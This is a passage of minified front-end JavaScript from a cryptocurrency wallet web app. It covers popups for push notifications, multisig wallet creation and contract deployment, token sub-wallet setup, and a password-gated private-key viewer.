                if (!u) {
                    resetState();
                    await initData()
                }
            }
            ;
            return O.createElement(aa, {
                visible: e.isVisible,
                onOpen: handleOpenPopup,
                onClose: handleClosePopup,
                width: 500,
                unclosable: !0
            }, O.createElement("div", {
                className: eg,
                onClick: handleClosePopup
            }, O.createElement("img", {
                src: Hh,
                alt: "Close"
            })), O.createElement("div", {
                className: zh
            }, 0 === a && O.createElement(info_step, {
                handleNext: goToNextStep
            }), 1 === a && O.createElement(ch, {
                handlePrev: handleBack,
                TOTAL_STEPS: 3,
                handleNext: handleSubmitAccountName
            }), 2 === a && O.createElement(Kh, {
                handleNext: handleChooseWallet,
                handlePrev: handleBack,
                TOTAL_STEPS: 3
            }), 3 === a && O.createElement(ah, {
                handleClosePopup,
                TOTAL_STEPS: 3,
                creationState: s,
                onFinish
            }), r && O.createElement("div", {
                className: Jh
            }, O.createElement(LoaderDots, {
                visible: !0
            }))))
        }
        ;
        var ng = a(9710);
        const rg = {
            popupPushNotifications: "popup-push-notifications_popupPushNotifications_1p_kd",
            wrapper: "popup-push-notifications_wrapper_2kLoN",
            footer: "popup-push-notifications_footer_NnUr-",
            buttonBack: "popup-push-notifications_buttonBack_puhEi"
        }
          , lg = undefined
          , popup_push_notifications = e => {
            const [t,a] = (0,
            O.useState)(!0)
              , handleConfirm = async () => {
                M.d || await ng.n.requestPermission();
                ng.n.changeUIVisibility(t);
                e.onClose()
            }
            ;
            return O.createElement(aa, {
                visible: e.isVisible,
                width: 480,
                onClose: e.onClose
            }, O.createElement("div", {
                className: rg.popupPushNotifications
            }, O.createElement("h3", null, "Notify me"), O.createElement("div", {
                className: rg.wrapper
            }, O.createElement("p", null, "Mark the checkbox below and receive a notification when one of your tx's received a confirmation or an incoming tx has been detected in the mempool."), O.createElement("p", null, "You can minimize this window or use other tabs, but don't close your browser."), O.createElement("p", null, "The browser may ask permission to send notifications if you use this feature for the first time."), O.createElement(mp, {
                className: rg.radio,
                checked: t,
                onChange: () => {
                    a(!t)
                }
            }, "Enable push notifications"), O.createElement("div", {
                className: rg.footer
            }, O.createElement("div", {
                className: rg.buttonBack,
                onClick: e.onClose
            }, "Back"), O.createElement(Yl, {
                className: rg.btn,
                color: "blue",
                onClick: handleConfirm
            }, "Confirm")))))
        }
          , sg = "label_label_AYLWs"
          , ig = "label_action_21OBK";
        function label_extends() {
            label_extends = Object.assign ? Object.assign.bind() : function(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var a = arguments[t];
                    for (var n in a)
                        Object.prototype.hasOwnProperty.call(a, n) && (e[n] = a[n])
                }
                return e
            }
            ;
            return label_extends.apply(this, arguments)
        }
        const og = undefined
          , LabelAction = e => {
            let {children: t, ...a} = e;
            return O.createElement("div", label_extends({
                className: ig
            }, a), t)
        }
          , label = e => {
            let {children: t, ...a} = e;
            return O.createElement("div", label_extends({
                className: sg
            }, a), t)
        }
          , cg = "confirm-info_wrapper_ClzF_"
          , ug = "confirm-info_title_36pfx"
          , dg = "confirm-info_subtitle_3fxsZ"
          , mg = "confirm-info_value_1TRpS"
          , pg = "confirm-info_subvalue_2wMAA"
          , fg = "confirm-info_copyButton_3O3KK";
        function confirm_info_extends() {
            confirm_info_extends = Object.assign ? Object.assign.bind() : function(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var a = arguments[t];
                    for (var n in a)
                        Object.prototype.hasOwnProperty.call(a, n) && (e[n] = a[n])
                }
                return e
            }
            ;
            return confirm_info_extends.apply(this, arguments)
        }
        const ConfirmInfoWrapper = e => {
            let {children: t} = e;
            return O.createElement("div", {
                className: cg
            }, t)
        }
          , Eg = ConfirmInfoWrapper
          , ConfirmInfoTitle = e => {
            let {children: t, ...a} = e;
            return O.createElement("div", confirm_info_extends({
                className: ug
            }, a), t)
        }
          , ConfirmInfoSubTitle = e => {
            let {children: t, ...a} = e;
            return O.createElement("div", confirm_info_extends({
                className: dg
            }, a), t)
        }
          , ConfirmInfoValue = e => {
            let {children: t} = e;
            return O.createElement("div", {
                className: mg
            }, t)
        }
          , ConfirmInfoSubValue = e => {
            let {children: t} = e;
            return O.createElement("div", {
                className: pg
            }, t)
        }
          , ConfirmInfoWallet = e => {
            let {wallet: t, type: a, title: n} = e;
            const r = !!t.accountName
              , l = t.accountName === t.title;
            return O.createElement(ConfirmInfoWrapper, null, O.createElement(ConfirmInfoTitle, null, n || ("from" === a ? "From wallet" : "To wallet"), O.createElement(ConfirmInfoSubTitle, null, !l && r ? "Account" : "Address")), O.createElement(ConfirmInfoValue, null, t.title, O.createElement(ConfirmInfoSubValue, null, !l && r ? t.accountName : t.address)))
        }
          , ConfirmButtonCopy = e => React.createElement(ButtonCopy, confirm_info_extends({}, e, {
            className: styles.copyButton
        }))
          , hg = a.p + "6bdd5529fc84450cee184bc8242e3558.svg"
          , gg = {
            popupWrapper: "popup-create-multisig_popupWrapper_2qmL0",
            footerButtonStatus: "popup-create-multisig_footerButtonStatus_U0Wp5 app_footerButtonStatus_1lnBU",
            addressData: "popup-create-multisig_addressData_3TZ2I",
            minSignatures: "popup-create-multisig_minSignatures_18mvZ",
            removeText: "popup-create-multisig_removeText_3uXTl",
            inputAddressData: "popup-create-multisig_inputAddressData_16eNQ",
            successTitle: "popup-create-multisig_successTitle_39vgE",
            successBlock: "popup-create-multisig_successBlock_H9fzw",
            buttonCopy: "popup-create-multisig_buttonCopy_3f_Pk",
            smartContractDetailLine: "popup-create-multisig_smartContractDetailLine_3m1UD",
            footerBlock: "popup-create-multisig_footerBlock_3lud9",
            loaderWrapper: "popup-create-multisig_loaderWrapper_3Y0_4",
            wrapperCreatedMultisig: "popup-create-multisig_wrapperCreatedMultisig_3Uz3e"
        };
        function CreateMultisigInputs(e) {
            const t = e.addressData;
            return O.createElement(O.Fragment, null, t.map(( (a, n) => O.createElement(lf.ValidatorField, {
                rules: zf[e.dataType],
                value: {
                    address: a || "",
                    isValidAddress: !0
                },
                key: `addressData${n}`
            }, (r => {
                let {isValid: l, message: s} = r;
                return O.createElement(O.Fragment, null, O.createElement(label, null, "Participant # ", n + 2), O.createElement("div", {
                    className: gg.addressData
                }, O.createElement(pa, {
                    isInvalid: !l && e.isErrorsVisible,
                    message: s
                }, O.createElement(Ea, {
                    placeholder: e.dataTypePlaceHolder,
                    type: "text",
                    value: a,
                    className: gg.inputAddressData,
                    onChange: t => e.onChange(n, t.target.value)
                }), t.length > 1 && O.createElement("div", {
                    className: gg.removeText,
                    onClick: () => e.removeInput(n)
                }, "Remove"))))
            }
            )))))
        }
        const yg = CreateMultisigInputs
          , manageCreateWallet = e => {
            let {currency: t, downloadType: a, captchaCode: n} = e;
            return async e => {
                const r = _e.ZP.getClass({
                    currency: t
                })
                  , l = {
                    currency: t
                };
                n && (l.code = n);
                const s = await (new r).create(l);
                e(rd.addWallet({
                    wallet: s,
                    options: {
                        downloadType: a
                    }
                }));
                await e(setActiveWallet(s));
                let i = !1;
                const {persistorFlushFailedFatally: o} = await e(storageFlush());
                return {
                    persistorFlushFailedFatally: o,
                    backupDownloaded: i,
                    walletModel: s
                }
            }
        }
        ;
        function fake_to_real_wallet_fakeSubWalletsForTokens(e, t) {
            let a = arguments.length > 2 && void 0 !== arguments[2] && arguments[2];
            const n = e.clone()
              , r = null == t ? void 0 : t.map((t => {
                const a = e.subWallets.find((e => e.data.smartContract && t.smartContract ? e.data.smartContract.toLowerCase() === t.smartContract.toLowerCase() : e.currency === t.ticker || e.ticker === t.ticker));
                return (new e.SubWalletModel).recoverFromPlainObject({
                    isFakeToken: !0,
                    uuid: a ? a.uuid : `${e.uuid}${t.ticker}`,
                    currency: t.ticker,
                    address: e.address,
                    precision: t.decimals || t.precision,
                    title: t.title,
                    family: e.currency,
                    privateKey: e.privateKey,
                    parentUuid: e.uuid,
                    smartContract: t.contract || t.smartContract,
                    balance: a ? a.balance : "0"
                })
            }
            ));
            if (a) {
                var l;
                const t = [];
                n.subWallets = null == e || null === (l = e.subWallets) || void 0 === l ? void 0 : l.concat(null == r ? void 0 : r.filter((e => e))).filter((e => {
                    var a, n;
                    if (!t.includes(null !== (a = null === (n = e.smartContract) || void 0 === n ? void 0 : n.toLowerCase()) && void 0 !== a ? a : "")) {
                        var r, l;
                        t.push(null !== (r = null === (l = e.smartContract) || void 0 === l ? void 0 : l.toLowerCase()) && void 0 !== r ? r : "");
                        return !0
                    }
                    return !1
                }
                ))
            } else
                n.subWallets = r.filter((e => e));
            return n
        }
        async function fakeToRealWallet(e, t, a) {
            if (e && e.isFakeToken) {
                const {parentUuid: n, ...r} = e.mapToPlainObject()
                  , l = t(n);
                if (l) {
                    r.privateKey = l.privateKey;
                    delete r.isFakeToken;
                    const e = await a(addSubWallet(l, r));
                    if (e)
                        return e
                }
            }
            return e
        }
        function use_create_wallet_useCreateWallet() {
            const e = usePopup()
              , t = (0,
            $.I0)()
              , a = undefined;
            return {
                createWallet: (0,
                O.useCallback)((async a => {
                    let {currency: n} = a;
                    if ("eos" !== n) {
                        if ("hbar" !== n)
                            return t(manageCreateWallet({
                                currency: n,
                                downloadType: Sm.AFTER_CREATE_WALLET
                            }));
                        e.open("import-or-create", {
                            initialTab: "create",
                            currency: "hbar"
                        })
                    } else
                        e.open("create-eos")
                }
                ), [t, e])
            }
        }
        function useGenerateAddressForNewCoinOrToken(e) {
            let {noDownloadBackup: t} = e;
            const a = (0,
            $.I0)()
              , n = (0,
            $.v9)(eu)
              , {createWallet: r} = use_create_wallet_useCreateWallet();
            async function generateAddressForCoin(e) {
                const t = await r({
                    currency: e.currency
                });
                return t && t.walletModel
            }
            async function generateAddressForToken(e, r) {
                var l;
                let s;
                if (r instanceof to.Z)
                    s = r;
                else {
                    const {walletModel: t} = await a(manageCreateWallet({
                        currency: e.family
                    }));
                    s = t
                }
                if (!s)
                    return;
                const i = (new s.SubWalletModel).recoverFromPlainObject({
                    isFakeToken: !0,
                    uuid: (0,
                    he.Z)().slice(0, 8),
                    currency: e.currency,
                    address: s.address,
                    title: e.title,
                    family: e.family,
                    precision: parseInt((null === (l = e.precision) || void 0 === l ? void 0 : l.toString()) || e.decimals || "", 10),
                    parentUuid: s.uuid,
                    smartContract: e.smartContract,
                    balance: "0"
                })
                  , o = await fakeToRealWallet(i, n, a);
                await a(setActiveWallet(o));
                if (!t) {
                    const e = undefined;
                    await a(handleDownload(Sm.AFTER_CREATE_WALLET)) && a(removeNotifyBackup())
                }
                return o
            }
            return {
                generateAddressForCoin,
                generateAddressForToken
            }
        }
        const objectToString = (e, t) => Object.keys(e).map((a => "object" == typeof e[a] ? objectToString(e[a], (e => `${a}[${e}]`)) : `${encodeURIComponent(t ? t(a) : a)}=${encodeURIComponent(e[a])}`)).join("&")
          , stringToObject = e => {
            const t = {}
              , a = ("?" === e[0] ? e.substr(1) : e).split("&");
            for (let e = 0; e < a.length; e += 1) {
                const n = a[e].split("=");
                if (n[0]) {
                    const e = decodeURIComponent(n[0]);
                    if (e.indexOf("[") < e.indexOf("]")) {
                        const a = e.split("[");
                        t[a[0]] = t[a[0]] || {};
                        const r = a[1].replace("]", "");
                        Object.assign(t[a[0]], {
                            [r]: n[1]
                        })
                    } else
                        t[e] = decodeURIComponent(n[1] || "")
                }
            }
            return t
        }
          , pureCreateCoinOrToken = async e => {
            let {wallet: t, isNewWallet: a, isNewToken: n, generateAddressForCoin: r, generateAddressForToken: l, parentWallet: s} = e
              , i = null;
            a && (i = await r(t));
            n && s && (i = await l(t, s));
            return i || t
        }
          , pureHandleTo = e => {
            let {path: t, wallet: a, isNewToken: n, isNewWallet: r, history: l, createNewCoinOrToken: s, parentWallet: i, fromWallet: o} = e;
            return async () => {
                let e = a;
                (n || r) && (e = await s({
                    wallet: e,
                    isNewToken: n,
                    isNewWallet: r,
                    parentWallet: i
                }));
                const c = {
                    walletFrom: e.uuid
                }
                  , u = {
                    walletTo: e.uuid
                };
                l.push({
                    pathname: t,
                    search: objectToString(o ? c : u)
                })
            }
        }
        ;
        function useCreateWalletAndGoTo(e) {
            let {noDownloadBackup: t} = e;
            const a = (0,
            j.k6)()
              , {generateAddressForCoin: n, generateAddressForToken: r} = useGenerateAddressForNewCoinOrToken({
                noDownloadBackup: t
            })
              , createNewCoinOrToken = e => {
                let {wallet: t, isNewWallet: a, isNewToken: l, parentWallet: s} = e;
                return pureCreateCoinOrToken({
                    wallet: t,
                    isNewWallet: a,
                    isNewToken: l,
                    generateAddressForCoin: n,
                    generateAddressForToken: r,
                    parentWallet: s
                })
            }
              , handleGo = e => {
                let {path: t, wallet: n, isNewWallet: r, isNewToken: l, parentWallet: s, fromWallet: i} = e;
                return pureHandleTo({
                    path: t,
                    wallet: n,
                    isNewWallet: r,
                    isNewToken: l,
                    history: a,
                    createNewCoinOrToken,
                    parentWallet: s,
                    fromWallet: i
                })
            }
            ;
            return {
                createNewCoinOrToken,
                handleGo
            }
        }
        const vg = ee.P.create({
            name: "popup-multisig"
        })
          , _g = {
            btc: {
                currency: "btc",
                family: "btc",
                title: "NEW Bitcoin wallet",
                isNewWallet: !0,
                type: we.uQ.BTC_LIKE_WALLET
            },
            "btc-testnet": {
                currency: "btc-testnet",
                family: "btc-testnet",
                title: "NEW Btc-testnet wallet",
                isNewWallet: !0,
                type: we.uQ.BTC_LIKE_WALLET
            },
            eth: {
                currency: "eth",
                family: "eth",
                title: "NEW Ethereum wallet",
                isNewWallet: !0,
                type: we.uQ.ETH_LIKE_WALLET
            },
            ropsten: {
                currency: "ropsten",
                family: "ropsten",
                title: "NEW Ropsten wallet",
                isNewWallet: !0,
                type: we.uQ.ETH_LIKE_WALLET
            },
            ggoe: {
                currency: "ggoe",
                family: "ggoe",
                title: "NEW Goerli wallet",
                isNewWallet: !0,
                type: we.uQ.ETH_LIKE_WALLET
            },
            ethw: {
                currency: "ethw",
                family: "ethw",
                title: "NEW ETHW wallet",
                isNewWallet: !0,
                type: we.uQ.ETH_LIKE_WALLET
            }
        }
          , wg = 10
          , getWalletDataType = e => {
            let {isEthBased: t} = e;
            return t ? "address" : "publicKey"
        }
          , getWalletDataLabel = e => {
            let {isEthBased: t} = e;
            return t ? "Wallet Address" : "Public Key"
        }
        ;
        function getAddessData(e) {
            let {wallet: t, addressData: a, isEthBased: n} = e;
            return t ? [t[getWalletDataType({
                isEthBased: n
            })], ...a] : a
        }
        function addInput(e) {
            let {setAddressData: t, addressData: a} = e;
            t([...a, ""])
        }
        function removeInput(e) {
            let {index: t, addressData: a, setAddressData: n} = e;
            const r = a.slice();
            r.splice(t, 1);
            n(r)
        }
        function handleChange(e) {
            let {index: t, addressData: a, setAddressData: n, value: r, setErrorsVisible: l} = e;
            const s = a.slice();
            s[t] = r;
            n(s);
            l(!1)
        }
        function handleChangeMinimal(e) {
            let {target: {value: t}, setMinSignatures: a} = e;
            a(t)
        }
        function isUnique(e) {
            let {wallet: t, addressData: a, isEthBased: n} = e;
            const r = getAddessData({
                wallet: t,
                addressData: a,
                isEthBased: n
            })
              , l = undefined;
            return [...new Set(r)].length === r.length
        }
        function getContractArgs(e) {
            let {wallet: t, addressData: a, isEthBased: n, minSignatures: r} = e;
            const l = [r, getAddessData({
                wallet: t,
                addressData: a,
                isEthBased: n
            })];
            (null == t ? void 0 : t.type) === we.aO.ERC20_TOKEN && l.push(t.smartContract);
            return l
        }
        async function estimatingEthData(e) {
            let {wallet: t, addressData: a, isEthBased: n, minSignatures: r, setSmartContractFee: l, setSmartContractGasLimit: s, setSmartContractGasPrice: i} = e;
            const o = getContractArgs({
                wallet: t,
                addressData: a,
                isEthBased: n,
                minSignatures: r
            })
              , c = getAddessData({
                wallet: t,
                addressData: a,
                isEthBased: n
            });
            z()(t, "Expected `wallet` to be defined.");
            const u = await Se.Z.getApiByWallet(t)
              , d = await u.estimateMultisigDeployGasLimit(c[0], o)
              , m = await u.getGasPrice();
            l((0,
            Ko.$q)((0,
            Ko.$q)(m, d), "1e-9").toString());
            s(d);
            i(m)
        }
        async function handleDeploySmartContract(e) {
            let {wallet: t, addressData: a, isEthBased: n, minSignatures: r, smartContractGasPrice: l, smartContractGasLimit: s, setIsError: i, setLoading: o, setMultisigAddress: c, setTransactionLink: u} = e;
            try {
                i(!1);
                o(!0);
                z()(t, "Expected `wallet` to be defined.");
                const e = await Se.Z.getApiByWallet(t)
                  , d = getAddessData({
                    wallet: t,
                    addressData: a,
                    isEthBased: n
                })
                  , m = await e.getNonce({
                    addressFrom: d[0]
                })
                  , p = await e.createMultisigAddress(d[0], t.privateKey, getContractArgs({
                    wallet: t,
                    addressData: a,
                    isEthBased: n,
                    minSignatures: r
                }), l, s, m)
                  , f = {
                    participants: d.map((e => ({
                        data: e
                    }))),
                    currency: t.currency,
                    minimumSigAmount: r,
                    walletType: "smartContract",
                    walletAddressData: p.hash,
                    smartContract: t.smartContract,
                    family: t.family || t.currency
                };
                await U.nW.post("/api/v1/internal/multisigs/new", f);
                o(!1);
                c(p.hash);
                u((0,
                be.Kb)(t.family, t.currency, p.hash))
            } catch (e) {
                i(!0);
                vg.error("Error while deploying multisig contract", e);
                o(!1)
            }
        }
        const PopupCreateMultisig = e => {
            const t = (0,
            $.I0)()
              , [a,n] = (0,
            O.useState)([])
              , [r,l] = (0,
            O.useState)(2)
              , [s,i] = (0,
            O.useState)(!1)
              , [o,c] = (0,
            O.useState)(!1)
              , [u,d] = (0,
            O.useState)("")
              , [m,p] = (0,
            O.useState)("")
              , [f,E] = (0,
            O.useState)(null)
              , [h,g] = (0,
            O.useState)("0")
              , [y,v] = (0,
            O.useState)("")
              , [_,w] = (0,
            O.useState)("")
              , [b,k] = (0,
            O.useState)(!1)
              , [S,C] = (0,
            O.useState)(!1)
              , N = O.createRef()
              , T = (0,
            $.v9)($c)
              , {createNewCoinOrToken: A} = useCreateWalletAndGoTo({
                noDownloadBackup: !0
            })
              , x = a.length + 1 < wg;
            (0,
            O.useEffect)(( () => {
                f && C((null == f ? void 0 : f.type) === we.uQ.ETH_LIKE_WALLET || (null == f ? void 0 : f.type) === we.aO.ERC20_TOKEN)
            }
            ), [f]);
            (0,
            O.useEffect)(( () => {
                e.wallet && E(e.wallet)
            }
            ), [e.wallet]);
            (0,
            O.useEffect)(( () => {
                if (e.newWallet) {
                    const t = T.find((t => {
                        var a, n;
                        return (null == t || null === (a = t.currency) || void 0 === a ? void 0 : a.toLowerCase()) === (null == e || null === (n = e.newWallet) || void 0 === n ? void 0 : n.toLowerCase())
                    }
                    ));
                    t ? E(t) : e.newWallet && _g[e.newWallet] && E(_g[e.newWallet])
                }
            }
            ), [e.newWallet, T]);
            function resetState() {
                n([""]);
                g("0");
                i(!1);
                c(!1);
                l(2);
                d("")
            }
            (0,
            O.useEffect)(( () => {
                f && S && !f.isNewWallet && estimatingEthData({
                    wallet: f,
                    addressData: a,
                    isEthBased: S,
                    minSignatures: r,
                    setSmartContractFee: g,
                    setSmartContractGasLimit: v,
                    setSmartContractGasPrice: w
                })
            }
            ), [a, S, r, f, null == f ? void 0 : f.address]);
            async function createMultisig() {
                var e, n;
                const {isValid: l} = null !== (e = null === (n = N.current) || void 0 === n ? void 0 : n.validate()) && void 0 !== e ? e : {};
                if (!l) {
                    c(!0);
                    return
                }
                if (!f) {
                    c(!0);
                    return
                }
                let s = f;
                if (null != f && f.isNewWallet) {
                    const e = await A({
                        wallet: f,
                        isNewToken: !1,
                        isNewWallet: !0,
                        parentWallet: null
                    });
                    if (e) {
                        s = e;
                        E(e)
                    }
                }
                try {
                    if (S) {
                        handleDeploySmartContract({
                            wallet: s,
                            addressData: a,
                            isEthBased: S,
                            minSignatures: r,
                            smartContractGasPrice: _,
                            smartContractGasLimit: y,
                            setIsError: k,
                            setLoading: i,
                            setMultisigAddress: d,
                            setTransactionLink: p
                        });
                        return
                    }
                    z()(s, "Expected `wallet` to be defined.");
                    const e = await Se.Z.getApiByWallet(s)
                      , n = getAddessData({
                        wallet: s,
                        addressData: a,
                        isEthBased: S
                    })
                      , l = {
                        participants: n.map((e => ({
                            data: e
                        }))),
                        walletType: "script",
                        walletAddressData: e.createMultisigAddress({
                            publicKeys: n,
                            minSignatures: parseInt(String(r), 10)
                        }),
                        currency: s.currency,
                        minimumSigAmount: r,
                        family: s.family || s.currency
                    };
                    await U.nW.post("/api/v1/internal/multisigs/new", l);
                    await t(fetchMultisigs());
                    t(updateWalletsBalanceAndTxs(s, {
                        isCascade: !1
                    }));
                    vg.log("New multisig created", l.walletAddressData);
                    cc.$.send(cc.d.MULTISIG_CREATE, f.currency);
                    d(l.walletAddressData)
                } catch (e) {
                    vg.error("Error while creating redeem script", e)
                }
            }
            function customFilterWallets(e) {
                return Boolean(e[getWalletDataType({
                    isEthBased: S
                })] && e.currency === (null == f ? void 0 : f.currency))
            }
            return O.createElement(aa, {
                visible: e.isVisible,
                onOpen: resetState,
                onClose: e.onClose,
                width: 480
            }, O.createElement("div", {
                className: gg.popupWrapper
            }, u && O.createElement("div", {
                className: gg.wrapperCreatedMultisig
            }, O.createElement("div", {
                className: gg.successTitle
            }, S ? O.createElement("span", null, "Transaction successfully sent") : O.createElement("span", null, "Multisig successfully created")), O.createElement("div", {
                className: gg.successBlock
            }, O.createElement("img", {
                src: hg,
                alt: ""
            }), S ? O.createElement("span", null, "Transaction Hash:") : O.createElement("span", null, "Your Multisig Address:"), O.createElement("div", null, S && O.createElement("a", {
                href: m,
                target: "_blank",
                rel: "noreferrer noopener"
            }, formatAddress(u, 10)), !S && O.createElement(button_copy, {
                text: u,
                className: gg.buttonCopy
            }, (e => e ? "Сopied to clipboard" : u)))), O.createElement("div", {
                className: gg.footerButtonStatus
            }, O.createElement("div", null), O.createElement(Yl, {
                onClick: e.onClose,
                color: "blue",
                size: "big"
            }, "Close"), O.createElement("div", null))), !u && O.createElement(O.Fragment, null, O.createElement("h2", null, "Create multisig"), O.createElement("p", null, "Multisig stands for multi-signature. This is a specific type of digital signature that enables two or more Guarda users to sign transactions. Therefore, multiple participants are required to confirm the transaction."), O.createElement(sf(), {
                ref: N
            }, O.createElement("div", null, O.createElement("div", {
                className: "relative"
            }, O.createElement("div", {
                className: gg.minSignatures
            }, O.createElement(label, null, "Minimum signatures to spend:"), O.createElement(lf.ValidatorField, {
                rules: zf.minimumSigAmount(2, getAddessData({
                    wallet: f,
                    addressData: a,
                    isEthBased: S
                }).length),
                value: r
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isInvalid: !t && o,
                    message: a
                }, O.createElement(Ea, {
                    type: "text",
                    value: r,
                    onChange: e => {
                        var t;
                        return handleChangeMinimal({
                            target: {
                                value: null == e || null === (t = e.target) || void 0 === t ? void 0 : t.value
                            },
                            setMinSignatures: l
                        })
                    }
                    ,
                    className: gg.minSignaturesInput
                }))
            }
            ))), O.createElement(lf.ValidatorField, {
                rules: zf.wallet,
                value: f
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement("div", null, O.createElement(label, null, "Participant # 1"), O.createElement("div", null, O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && o,
                    message: a
                }, O.createElement(Mh, {
                    selectedWallet: null != f ? f : void 0,
                    wallets: T,
                    addNewWalletForToken: null == f ? void 0 : f.isNewWallet,
                    onChange: E,
                    customFilter: customFilterWallets
                }))))
            }
            )), O.createElement(yg, {
                dataType: `${getWalletDataType({
                    isEthBased: S
                })}Multisig`,
                dataTypePlaceHolder: getWalletDataLabel({
                    isEthBased: S
                }),
                addressData: a,
                onChange: (e, t) => handleChange({
                    index: e,
                    addressData: a,
                    setAddressData: n,
                    value: t,
                    setErrorsVisible: c
                }),
                removeInput: e => removeInput({
                    index: e,
                    addressData: a,
                    setAddressData: n
                }),
                isErrorsVisible: o
            })), O.createElement(lf.ValidatorField, {
                rules: zf.bool,
                value: isUnique({
                    wallet: f,
                    addressData: a,
                    isEthBased: S
                })
            }, (e => {
                let {isValid: t} = e;
                return !t && o && O.createElement(ui_message, {
                    type: "error"
                }, "Participants keys are not unique")
            }
            )), f && S && O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Network fee"), O.createElement(ConfirmInfoValue, null, h, " ", (0,
            be.wL)((0,
            be.xG)(f.family || f.currency)))), b && O.createElement(ui_message, {
                type: "error"
            }, "Failed deploy smart contract"), O.createElement("div", {
                className: gg.footerButtonStatus
            }, s && O.createElement(LoaderDots, {
                visible: !0
            }), x && O.createElement("div", {
                onClick: () => addInput({
                    setAddressData: n,
                    addressData: a
                }),
                className: "dashedNormal"
            }, "+ Add one more"), O.createElement("div", null), O.createElement(Yl, {
                disabled: s,
                onClick: createMultisig,
                color: "blue",
                size: "big"
            }, "Publish")))))))
        }
          , bg = PopupCreateMultisig;
        var kg = a(79361)
          , Sg = a.n(kg);
        const Cg = "qr-code_wrapper_2xCo6"
          , qr_code = e => {
            let {value: t, size: a, className: n} = e;
            return O.createElement("div", {
                className: Ht()(Cg, n)
            }, O.createElement(Sg(), {
                bgColor: "#fff",
                fgColor: ha.colorDarkBlocks,
                size: a - 10,
                value: t
            }))
        }
          , Ng = a.p + "9de778caad3da6684ddf0a72661c220a.svg"
          , Tg = a.p + "77b84500741efbfe22c8abc78093e103.svg"
          , Ag = a.p + "49127d39aca99e1c3ee800aa11ce6f88.svg"
          , xg = {
            lineInformation: "popup-private-key_lineInformation_3E-hF",
            inputPassword: "popup-private-key_inputPassword_FQbxI",
            button: "popup-private-key_button_3Vto7",
            linePassword: "popup-private-key_linePassword_2CTyp",
            fancyLabel: "popup-private-key_fancyLabel_LvGSS",
            passwordError: "popup-private-key_passwordError_Z2niW",
            infoWrapper: "popup-private-key_infoWrapper_a5cpR",
            h1: "popup-private-key_h1_2s5RI",
            text: "popup-private-key_text_vpJ10",
            label: "popup-private-key_label_3q_ra",
            labelInfo: "popup-private-key_labelInfo_36GrG",
            iconWrapper: "popup-private-key_iconWrapper_1MWHF",
            buttonCopy: "popup-private-key_buttonCopy_145X_ styles_dashedNormal_xEvl8",
            buttonWrapper: "popup-private-key_buttonWrapper_KTAa3",
            okButton: "popup-private-key_okButton_37Hrm",
            iconQRCode: "popup-private-key_iconQRCode_2EuEB",
            icon: "popup-private-key_icon_7FB2A",
            pkBlock: "popup-private-key_pkBlock_13ui4",
            description: "popup-private-key_description_1odxO",
            popupPrivateKey: "popup-private-key_popupPrivateKey_330NL",
            liftPopupHigher: "popup-private-key_liftPopupHigher_P2bBm"
        }
          , PopupPrivateKeys = e => {
            var t, a, n, r, l;
            const {wallet: s} = e
              , i = (0,
            $.I0)()
              , [o,c] = (0,
            O.useState)("")
              , [u,d] = (0,
            O.useState)(!1)
              , [m,p] = (0,
            O.useState)(!1)
              , [f,E] = (0,
            O.useState)()
              , h = (0,
            O.useRef)(null)
              , g = (0,
            $.v9)(oe.DU)
              , y = (0,
            O.useMemo)(( () => {
                var e;
                const t = null == s || null === (e = s.privateKey) || void 0 === e ? void 0 : e.mnemonic
                  , a = null == s ? void 0 : s.uuid
                  , n = null == a ? void 0 : a.includes("_i");
                return t || (n ? void 0 : g)
            }
            ), [s, g])
              , handleClose = () => {
                p(!1);
                c("");
                e.onClose()
            }
              , checkPassword = e => {
                var t;
                const a = undefined;
                if (i(checkMasterPassword(o)))
                    e();
                else {
                    c("");
                    null === (t = h.current) || void 0 === t || t.focus();
                    d(!0);
                    setTimeout(( () => d(!1)), 3e3)
                }
            }
              , handleCheckShowPassword = () => {
                checkPassword(( () => p(!0)))
            }
            ;
            let v = null !== (t = null !== (a = null == s || null === (n = s.privateKey) || void 0 === n || null === (r = n.privateKey) || void 0 === r ? void 0 : r.privateKey) && void 0 !== a ? a : null == s || null === (l = s.privateKey) || void 0 === l ? void 0 : l.privateKey) && void 0 !== t ? t : null == s ? void 0 : s.privateKey;
            "string" == typeof v && y && (v = {
                privateKey: v,
                mnemonic: y
            });
            const _ = (0,
            O.useMemo)(( () => "object" == typeof v && "privateKey"in v && "mnemonic"in v && v.privateKey === v.mnemonic), [v]);
            return O.createElement(O.Fragment, null, f ? O.createElement(aa, {
                visible: Boolean(f),
                width: 320,
                onClose: () => {
                    E(void 0);
                    handleClose()
                }
            }, O.createElement(qr_code, {
                size: 300,
                value: f || ""
            })) : O.createElement(aa, {
                visible: e.isVisible,
                onClose: handleClose,
                width: 450,
                className: xg.popupPrivateKey
            }, O.createElement("div", {
                className: xg.infoWrapper
            }, O.createElement("h1", {
                className: xg.h1
            }, null == s ? void 0 : s.title), O.createElement("p", {
                className: xg.text
            }, "Private key"), O.createElement("div", {
                className: xg.label
            }, "Balance"), O.createElement("div", {
                className: xg.labelInfo
            }, null == s ? void 0 : s.balance), O.createElement("div", {
                className: xg.label
            }, "Address"), O.createElement("div", {
                className: xg.labelInfo
            }, O.createElement("span", null, null == s ? void 0 : s.address), O.createElement(button_copy, {
                text: null == s ? void 0 : s.address,
                className: xg.buttonCopy
            }, (e => e ? O.createElement("img", {
                className: xg.icon,
                src: Ag,
                alt: "Copy"
            }) : O.createElement("img", {
                src: Ng,
                alt: "Copy"
            }))), O.createElement("img", {
                src: Tg,
                alt: "",
                className: xg.iconQRCode,
                onClick: () => E(null == s ? void 0 : s.address)
            })), m && O.createElement("div", {
                className: xg.pkBlock
            }, v && "string" == typeof v ? O.createElement("div", {
                className: xg.lineInformation
            }, O.createElement("div", {
                className: xg.label
            }, "Private Key:"), O.createElement("div", {
                className: xg.labelInfo
            }, O.createElement("span", null, v), O.createElement(button_copy, {
                text: v,
                className: xg.buttonCopy
            }, (e => e ? O.createElement("img", {
                className: xg.icon,
                src: Ag,
                alt: "Copy"
            }) : O.createElement("img", {
                src: Ng,
                alt: "Copy"
            }))), O.createElement("img", {
                src: Tg,
                alt: "",
                className: xg.iconQRCode,
                onClick: () => {
                    v && "string" == typeof v && E(v)
                }
            }))) : null, ((0,
